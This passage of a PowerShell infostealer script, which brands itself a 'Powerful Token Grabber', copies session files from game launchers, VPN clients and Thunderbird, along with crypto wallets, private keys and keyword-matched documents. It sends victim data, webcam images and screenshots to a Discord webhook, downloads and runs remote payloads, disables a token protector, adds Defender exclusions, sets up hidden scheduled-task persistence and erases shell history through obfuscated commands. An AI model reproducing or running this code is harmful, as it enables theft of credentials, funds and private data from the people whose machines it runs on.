        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
        $epicgames_session = "$folder_gaming\EpicGames"
        New-Item -ItemType Directory -Force -Path $epicgames_session
        Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
    }

    # Ubisoft Session Stealer
    function ubisoftstealer {
        $processname = "upc"
        $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
        if (!(Test-Path $ubisoftfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue'-ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
        $ubisoft_session = "$folder_gaming\Ubisoft"
        New-Item -ItemType Directory -Force -Path $ubisoft_session
        Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
    }

    # EA Session Stealer
    function electronic_arts {
        $processname = "eadesktop"
        $eafolder = "$env:localappdata\Electronic Arts"
        if (!(Test-Path $eafolder)) { return }
        $ea_session = "$folder_gaming\Electronic Arts"
        if (!(Test-Path $ea_session)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        New-Item -ItemType Directory -Force -Path $ea_session
        Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
    }

    # Growtopia Stealer
    function growtopiastealer {
        $processname = "growtopia"
        $growtopiafolder = "$env:localappdata\Growtopia"
        if (!(Test-Path $growtopiafolder)) { return }
        $growtopia_session = "$folder_gaming\Growtopia"
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        New-Item -ItemType Directory -Force -Path $growtopia_session
        Copy-Item -Path "$growtopiafolder\save.dat" -Destination $growtopia_session -Recurse -force
    }
    
    function battle_net_stealer {
        $processnames = @("Battle.net", "Agent")
        $battle_folder = "$env:appdata\Battle.net"
        if (!(Test-Path $battle_folder)) { return }
        foreach ($process in $processnames) { Stop-Process -Name $process -ErrorAction 'SilentlyContinue' -Force }
        $battle_session = "$folder_gaming\Battle.net"
        New-Item -ItemType Directory -Force -Path $battle_session
        $files = Get-ChildItem -Path $battle_folder -File -Recurse -Include "*.db", "*.config" 
        foreach ($file in $files) {
            Copy-Item -Path $file.FullName -Destination $battle_session
        }
    }
	
    # All VPN Sessions

    # NordVPN 
    function nordvpnstealer {
        $processname = "nordvpn"
        $nordvpnfolder = "$env:localappdata\nordvpn"
        if (!(Test-Path $nordvpnfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $nordvpn_account = "$folder_vpn\NordVPN"
        New-Item -ItemType Directory -Force -Path $nordvpn_account
        $pattern = "^([A-Za-z]+\.exe_Path_[A-Za-z0-9]+)$"
        $directories = Get-ChildItem -Path $nordvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
        $files = Get-ChildItem -Path $nordvpnfolder -File | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $nordvpn_account -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
        }
        foreach ($file in $files) {
            $destinationPath = Join-Path -Path $nordvpn_account -ChildPath $file.Name
            Copy-Item -Path $file.FullName -Destination $destinationPath -Force
        }
        Copy-Item -Path "$nordvpnfolder\ProfileOptimization" -Destination $nordvpn_account -Recurse -force   
        Copy-Item -Path "$nordvpnfolder\libmoose.db" -Destination $nordvpn_account -Recurse -force
    }
    
	
    # ProtonVPN
    function protonvpnstealer {
        $processname = "protonvpn"
        $protonvpnfolder = "$env:localappdata\protonvpn"  
        if (!(Test-Path $protonvpnfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $protonvpn_account = "$folder_vpn\ProtonVPN"
        New-Item -ItemType Directory -Force -Path $protonvpn_account
        $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
        $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
        $files = Get-ChildItem -Path $protonvpnfolder -File | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
        }
        foreach ($file in $files) {
            $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $file.Name
            Copy-Item -Path $file.FullName -Destination $destinationPath -Force
        }
        Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -force
    }
    
	
    #Surfshark VPN
    function surfsharkvpnstealer {
        $processname = "Surfshark"
        $surfsharkvpnfolder = "$env:appdata\Surfshark"
        if (!(Test-Path $surfsharkvpnfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $surfsharkvpn_account = "$folder_vpn\Surfshark"
        New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
        Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
    }
    
	
    function Export-Data_Sessions {		
        telegramstealer
        elementstealer
        icqstealer
        signalstealer
        viberstealer
        whatsappstealer
        skype_stealer
        steamstealer
        minecraftstealer
        epicgames_stealer
        ubisoftstealer
        electronic_arts
        growtopiastealer
        battle_net_stealer
        nordvpnstealer
        protonvpnstealer
        surfsharkvpnstealer		
    }
    Export-Data_Sessions
	
    # Thunderbird Exfil
    If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
        $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
        New-Item -Path "$folder_email\Thunderbird" -ItemType Directory | Out-Null
        Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$folder_email\Thunderbird" -Recurse -Force
    }
	
    function Invoke-Crypto_Wallets {
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
            New-Item -Path "$folder_crypto\Armory" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$folder_crypto\Armory" -Recurse -Force
        }
    
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
            New-Item -Path "$folder_crypto\Atomic" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\Atomic" -Recurse -Force
        }
    
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
            New-Item -Path "$folder_crypto\BitcoinCore" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\BitcoinCore" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\bytecoin") {
            New-Item -Path "$folder_crypto\bytecoin" -ItemType Directory | Out-Null
            Get-ChildItem ("$env:userprofile\AppData\Roaming\bytecoin", "$env:userprofile") -Include *.wallet -Recurse | Copy-Item -Destination "$folder_crypto\bytecoin" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Local\Coinomi") {
            New-Item -Path "$folder_crypto\Coinomi" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Local\Coinomi\Coinomi\wallets" -Recurse | Copy-Item -Destination "$folder_crypto\Coinomi" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Dash") {
            New-Item -Path "$folder_crypto\DashCore" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Dash\Dash-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\DashCore" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Electrum") {
            New-Item -Path "$folder_crypto\Electrum" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Electrum\wallets" -Recurse | Copy-Item -Destination "$folder_crypto\Electrum" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Ethereum") {
            New-Item -Path "$folder_crypto\Ethereum" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Ethereum\keystore" -Recurse | Copy-Item -Destination "$folder_crypto\Ethereum" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
            New-Item -Path "$folder_crypto\exodus.wallet" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$folder_crypto\exodus.wallet" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
            New-Item -Path "$folder_crypto\Guarda" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\IndexedDB" -Recurse | Copy-Item -Destination "$folder_crypto\Guarda" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
            New-Item -Path "$folder_crypto\liberty.jaxx" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\liberty.jaxx" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Litecoin") {
            New-Item -Path "$folder_crypto\Litecoin" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Litecoin\Litecoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\Litecoin" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\monero-project") {
            New-Item -Path "$folder_crypto\Monero" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\monero-project\monero-core" -Name wallet_path).wallet_path -Recurse | Copy-Item -Destination "$folder_crypto\Monero" -Recurse  -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Zcash") {
            New-Item -Path "$folder_crypto\Zcash" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$folder_crypto\Zcash" -Recurse -Force
        }
    }
    Invoke-Crypto_Wallets

    $embed_and_body = @{
        "username"    = "KDOT"
        "content"     = "@everyone"
        "title"       = "KDOT"
        "description" = "Powerful Token Grabber"
        "color"       = "3447003"
        "avatar_url"  = "https://i.postimg.cc/k58gQ03t/PTG.gif"
        "url"         = "https://discord.gg/vk3rBhcj2y"
        "embeds"      = @(
            @{
                "title"       = "POWERSHELL GRABBER"
                "url"         = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/tree/main"
                "description" = "New victim info collected !"
                "color"       = "3447003"
                "footer"      = @{
                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
                }
                "thumbnail"   = @{
                    "url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
                }
                "fields"      = @(
                    @{
                        "name"  = ":satellite: IP"
                        "value" = "``````$ip``````"
                    },
                    @{
                        "name"  = ":bust_in_silhouette: User Information"
                        "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                    },
                    @{
                        "name"  = ":shield: Antivirus"
                        "value" = "``````$avlist``````"
                    },
                    @{
                        "name"  = ":computer: Hardware"
                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                    },
                    @{
                        "name"  = ":floppy_disk: Disk"
                        "value" = "``````$alldiskinfo``````"
                    },
                    @{
                        "name"  = ":signal_strength: WiFi"
                        "value" = "``````$wifi``````"
                    }
                )
            }
        )
    }

    $payload = $embed_and_body | ConvertTo-Json -Depth 10
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null

    # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
    #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.
    function Get-WebcamIMG {
        I'E'X(New-Object Net.WebClient)."`D`o`wn`l`oa`d`Str`in`g"("https://github.com/Chainski/PowerShell-Token-Grabber/raw/main/frontend-src/webcam.ps1")
    }
    Get-WebcamIMG

    $items = Get-ChildItem -Path "$env:APPDATA\KDOT" -Filter out*.jpg
    foreach ($item in $items) {
        $name = $item.Name
        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:APPDATA\KDOT\$name\`"" $webhook | out-null
        Remove-Item -Path "$env:APPDATA\KDOT\$name" -Force
    }
    
    # Works since most victims will have a weak password which can be bruteforced
    function ExportPrivateKeys {
        $privatekeysfolder = "$important_files\Certificates & Private Keys"
        New-Item -ItemType Directory -Path $privatekeysfolder -Force
        $sourceDirectory = $env:HOMEPATH
        $destinationDirectory = "$important_files\Certificates & Private Keys"
        $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
        $foundFiles = Get-ChildItem -Path $sourceDirectory -Recurse -Include $fileExtensions -File
        foreach ($file in $foundFiles) {
            Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force
        }
    }
    ExportPrivateKeys
	
  Function Invoke-GrabFiles {
        $grabber = @(
            "2fa",
            "acc",
            "atomic wallet",
            "account",
            "backup",
	    "bank",
            "bitcoin",
            "backupcode",
            "bitwarden",
            "bitcoin",
            "code",
            "coinbase",
            "crypto",
            "dashlane",
            "default",
            "discord",
            "disk",
            "eth",
            "exodus",
            "facebook",
            "fb",
	    "funds",
            "keepass",
            "keepassxc",
            "keys",
            "lastpass",
            "login",
            "mail",
            "memo",
            "metamask",
            "note",
            "nordpass",
            "pass",
            "paypal",
            "private",
            "pw",
            "recovery",
            "remote",
            "secret",
	    "passphrase",
            "seedphrase",
            "wallet seed",
            "server",
            "syncthing",
            "smart contract",
            "trading",
            "token",
            "wal",
            "wallet"
        )
        $dest = $important_files
        $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
        [regex] $grab_regex = "(" + (($grabber | ForEach-Object { [regex]::escape($_) }) -join "|") + ")"
    (Get-ChildItem -path $paths -Include @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")  -r | Where-Object Length -lt 1mb) -match $grab_regex | Copy-Item -Destination $dest -Force
    }
    Invoke-GrabFiles
	
    Set-Location "$env:LOCALAPPDATA\Temp"

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Stop-Process -Name DiscordTokenProtector -Force -ErrorAction 'SilentlyContinue'
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force -ErrorAction 'SilentlyContinue'
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }

    #try {
    #    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction 'SilentlyContinue'  | Out-Null
    #}
    #catch {}

    Start-BitsTransfer -Source "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/AutoBuild/grabber.exe" -Destination "$env:LOCALAPPDATA\Temp\main.exe"

    #Stop-Process -Name "discord" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
    #Stop-Process -Name "discordcanary" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
    #Stop-Process -Name "discordptb" -Force -ErrorAction 'SilentlyContinue'  | Out-Null


    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
    $proc.WaitForExit()

    $main_temp = "$env:localappdata\temp"
    $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
	
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $screens = [Windows.Forms.Screen]::AllScreens
    $top = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save("$main_temp\screenshot.png")
    $graphics.Dispose()
    $bmp.Dispose()
	
    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"KDOT\`", \`"content\`": \`"# :desktop: Screenshot\n\n\`"}" -F "file=@\`"$main_temp\screenshot.png\`"" "$($webhook)" | Out-Null

    
    Move-Item "$main_temp\discord.json" $folder_general -Force	
    Move-Item "$main_temp\screenshot.png" $folder_general -Force
    Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force
    #Move-Item -Path "$main_temp\cookies_netscape.txt" -Destination "$browser_data" -Force
    #move any file that starts with cookies_netscape
    Get-ChildItem -Path $main_temp -Filter "cookies_netscape*" | Move-Item -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\downloads.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\history.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\passwords.json" -Destination "$browser_data" -Force

    #remove empty dirs
    do {
        $dirs = Get-ChildItem $folder_general -Directory -Recurse | Where-Object { (Get-ChildItem $_.FullName).Count -eq 0 } | Select-Object -ExpandProperty FullName
        $dirs | ForEach-Object { Remove-Item $_ -Force }
    } while ($dirs.Count -gt 0)

    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"KDOT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\KDOT.zip" $webhook

    Remove-Item "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
    Remove-Item "$folder_general" -Force -Recurse
    Remove-Item "$main_temp\main.exe" -Force
}

function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
    Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
    # Hidden Directory
    $KDOT_DIR = get-item "$env:APPDATA\KDOT" -Force
    $KDOT_DIR.attributes = "Hidden", "System"
    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
    $task_name = "KDOT"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\KDOT\KDOT.ps1",0)(window.close)'
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
    Write-Host "Task Created" -ForegroundColor Green

    HOSTS-BLOCKER
    Backup-Data
}

if (INVOKE-AC -eq $true) {
    if ($debug -eq $true) {
        KDMUTEX
    }
    else {
        Hide-Console
        KDMUTEX
    }
    #removes history
    if ($debug) {
        Read-Host "Press Enter to continue..."
    }
    else {
        [ProcessUtility]::MakeProcessKillable()
    }
    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
}
else {
    Write-Host ("Please run as admin!") -ForegroundColor Red
    Start-Sleep -s 1
    Request-Admin
}
# SIG # Begin signature block
# MIIWnAYJKoZIhvcNAQcCoIIWjTCCFokCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUySncggOhEhQxg7h+4CDkdY9S
# 7o+gghDrMIIC/jCCAeagAwIBAgIQNZ2siXh+aIFO470KIbV4ADANBgkqhkiG9w0B
# AQsFADAXMRUwEwYDVQQDDAxLRE9UIFJvb3QgQ0EwHhcNMjQwNDI1MTgyNTA0WhcN
# MzQwNDI1MTgzNTA0WjAXMRUwEwYDVQQDDAxLRE9UIFJvb3QgQ0EwggEiMA0GCSqG
# SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCZpegRqfRB0TgxLaZe09cNUfKKxCkMtTSf
# AZ7+VSzVFTByUIs4qKgQoCvUhkZK933Kr0bAN+GHJGSKLJ9H0EMGTKQzUOvHc19Y
# gQaZowyxxK/GEAzF9DlItxwlYqsX1nEGoBovRzstW31s6ETiURhkTa6kS5a4ZUHg
# iLxwtk1b1Ndetc13tRdtX/VFF0I6K11dgpmlvmjIFJDxrl26+S6MkLgU722lrTfW
# rgfAdD+fREYIQB9yiy0kQHCzY+7pl2AKIrKK61OQOVXsxAhq3q2AgdUsy9MTXgE7
# nPK2pXQxnWBDPSzyJFyZXxzO128XipVQRZLCwfDIkaHNGT5iIhrtAgMBAAGjRjBE
# MA4GA1UdDwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU
# XkwhRG1dSXF1rLJ1BKloHInnYPswDQYJKoZIhvcNAQELBQADggEBACiMEK92Ue1x
# 0XEq2hR/XlVYlhbDJGASoHfyTv0Y3U6Mrb7+dE72E2/CTzhXL9T0iQtRVjgdIKEN
# Q8gfeeWZaIXamxnBzOgak6I/URsszj32Gr4H58KQGxQnixcGDQLgTswqlCVnMNNJ
# VjCPzSkTWzt0gGl0UYi6t68byqC1xkprVtpYwfreGGm1culRMiRSzGkmDK3nkXDV
# RyGoDPEXmZ5kHxM/qzeu8foDTJYpZqAozpzBzgybGQKA4iGsVk7BBjGeCZRXo+JD
# ocCe+l6ujEfpRp9NQdn4XBk6JJYE9kD6vMFdCYIRo+5V7p+3rm/BCSDDvO00v69P
# j94500kTVCswggbsMIIE1KADAgECAhAwD2+s3WaYdHypRjaneC25MA0GCSqGSIb3
# DQEBDAUAMIGIMQswCQYDVQQGEwJVUzETMBEGA1UECBMKTmV3IEplcnNleTEUMBIG
# A1UEBxMLSmVyc2V5IENpdHkxHjAcBgNVBAoTFVRoZSBVU0VSVFJVU1QgTmV0d29y
# azEuMCwGA1UEAxMlVVNFUlRydXN0IFJTQSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0
# eTAeFw0xOTA1MDIwMDAwMDBaFw0zODAxMTgyMzU5NTlaMH0xCzAJBgNVBAYTAkdC
# MRswGQYDVQQIExJHcmVhdGVyIE1hbmNoZXN0ZXIxEDAOBgNVBAcTB1NhbGZvcmQx
# GDAWBgNVBAoTD1NlY3RpZ28gTGltaXRlZDElMCMGA1UEAxMcU2VjdGlnbyBSU0Eg
# VGltZSBTdGFtcGluZyBDQTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB
# AMgbAa/ZLH6ImX0BmD8gkL2cgCFUk7nPoD5T77NawHbWGgSlzkeDtevEzEk0y/NF
# Zbn5p2QWJgn71TJSeS7JY8ITm7aGPwEFkmZvIavVcRB5h/RGKs3EWsnb111JTXJW
# D9zJ41OYOioe/M5YSdO/8zm7uaQjQqzQFcN/nqJc1zjxFrJw06PE37PFcqwuCnf8
# DZRSt/wflXMkPQEovA8NT7ORAY5unSd1VdEXOzQhe5cBlK9/gM/REQpXhMl/VuC9
# RpyCvpSdv7QgsGB+uE31DT/b0OqFjIpWcdEtlEzIjDzTFKKcvSb/01Mgx2Bpm1gK
# VPQF5/0xrPnIhRfHuCkZpCkvRuPd25Ffnz82Pg4wZytGtzWvlr7aTGDMqLufDRTU
# GMQwmHSCIc9iVrUhcxIe/arKCFiHd6QV6xlV/9A5VC0m7kUaOm/N14Tw1/AoxU9k
# gwLU++Le8bwCKPRt2ieKBtKWh97oaw7wW33pdmmTIBxKlyx3GSuTlZicl57rjsF4
# VsZEJd8GEpoGLZ8DXv2DolNnyrH6jaFkyYiSWcuoRsDJ8qb/fVfbEnb6ikEk1Bv8
# cqUUotStQxykSYtBORQDHin6G6UirqXDTYLQjdprt9v3GEBXc/Bxo/tKfUU2wfeN
# gvq5yQ1TgH36tjlYMu9vGFCJ10+dM70atZ2h3pVBeqeDAgMBAAGjggFaMIIBVjAf
# BgNVHSMEGDAWgBRTeb9aqitKz1SA4dibwJ3ysgNmyzAdBgNVHQ4EFgQUGqH4YRkg
# D8NBd0UojtE1XwYSBFUwDgYDVR0PAQH/BAQDAgGGMBIGA1UdEwEB/wQIMAYBAf8C
# AQAwEwYDVR0lBAwwCgYIKwYBBQUHAwgwEQYDVR0gBAowCDAGBgRVHSAAMFAGA1Ud
# HwRJMEcwRaBDoEGGP2h0dHA6Ly9jcmwudXNlcnRydXN0LmNvbS9VU0VSVHJ1c3RS
# U0FDZXJ0aWZpY2F0aW9uQXV0aG9yaXR5LmNybDB2BggrBgEFBQcBAQRqMGgwPwYI
# KwYBBQUHMAKGM2h0dHA6Ly9jcnQudXNlcnRydXN0LmNvbS9VU0VSVHJ1c3RSU0FB
# ZGRUcnVzdENBLmNydDAlBggrBgEFBQcwAYYZaHR0cDovL29jc3AudXNlcnRydXN0
# LmNvbTANBgkqhkiG9w0BAQwFAAOCAgEAbVSBpTNdFuG1U4GRdd8DejILLSWEEbKw
# 2yp9KgX1vDsn9FqguUlZkClsYcu1UNviffmfAO9Aw63T4uRW+VhBz/FC5RB9/7B0
# H4/GXAn5M17qoBwmWFzztBEP1dXD4rzVWHi/SHbhRGdtj7BDEA+N5Pk4Yr8TAcWF
# o0zFzLJTMJWk1vSWVgi4zVx/AZa+clJqO0I3fBZ4OZOTlJux3LJtQW1nzclvkD1/
# RXLBGyPWwlWEZuSzxWYG9vPWS16toytCiiGS/qhvWiVwYoFzY16gu9jc10rTPa+D
# BjgSHSSHLeT8AtY+dwS8BDa153fLnC6NIxi5o8JHHfBd1qFzVwVomqfJN2Udvuq8
# 2EKDQwWli6YJ/9GhlKZOqj0J9QVst9JkWtgqIsJLnfE5XkzeSD2bNJaaCV+O/fex
# UpHOP4n2HKG1qXUfcb9bQ11lPVCBbqvw0NP8srMftpmWJvQ8eYtcZMzN7iea5aDA
# DHKHwW5NWtMe6vBE5jJvHOsXTpTDeGUgOw9Bqh/poUGd/rG4oGUqNODeqPk85sEw
# u8CgYyz8XBYAqNDEf+oRnR4GxqZtMl20OAkrSQeq/eww2vGnL8+3/frQo4TZJ577
# AWZ3uVYQ4SBuxq6x+ba6yDVdM3aO8XwgDCp3rrWiAoa6Ke60WgCxjKvj+QrJVF3U
# uWp0nr1Irpgwggb1MIIE3aADAgECAhA5TCXhfKBtJ6hl4jvZHSLUMA0GCSqGSIb3
# DQEBDAUAMH0xCzAJBgNVBAYTAkdCMRswGQYDVQQIExJHcmVhdGVyIE1hbmNoZXN0
# ZXIxEDAOBgNVBAcTB1NhbGZvcmQxGDAWBgNVBAoTD1NlY3RpZ28gTGltaXRlZDEl
# MCMGA1UEAxMcU2VjdGlnbyBSU0EgVGltZSBTdGFtcGluZyBDQTAeFw0yMzA1MDMw
# MDAwMDBaFw0zNDA4MDIyMzU5NTlaMGoxCzAJBgNVBAYTAkdCMRMwEQYDVQQIEwpN
# YW5jaGVzdGVyMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxLDAqBgNVBAMMI1Nl
# Y3RpZ28gUlNBIFRpbWUgU3RhbXBpbmcgU2lnbmVyICM0MIICIjANBgkqhkiG9w0B
# AQEFAAOCAg8AMIICCgKCAgEApJMoUkvPJ4d2pCkcmTjA5w7U0RzsaMsBZOSKzXew
